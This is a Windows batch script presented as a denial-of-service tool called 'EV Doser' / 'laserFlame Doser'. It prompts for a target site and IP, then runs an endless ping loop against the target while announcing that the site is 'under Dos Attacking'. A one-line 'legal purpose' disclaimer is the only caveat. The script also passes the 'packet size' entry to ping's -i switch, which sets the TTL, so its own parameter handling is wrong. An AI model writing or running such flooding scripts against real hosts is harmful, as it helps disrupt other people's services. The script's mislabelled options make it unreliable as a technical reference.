@echo off
mode 10
title EV Doser v.1
color 0a
cls
echo.
echo ===================================
echo          laserFlame Doser
echo       Created by Electrovirus
echo ===================================
echo.
set /p x=Target-URL:
echo.
echo ===================================
ping %x%
echo ===================================
@ping.exe 127.0.0.1 -n 5 -w 1000 > nul
goto Next
:Next
echo.
set /p m=Target IP: 
echo.
set /p n=Packet Size:
echo.
color 0c
cls
echo ===================================
echo   Attacking started in background
echo     Site is under Dos Attacking
echo Please use this in a legal purpose
echo       Created By Electrovirus
echo ===================================
echo.
:DDOS
ping %m% -i %n% -t >nul
goto DDOS

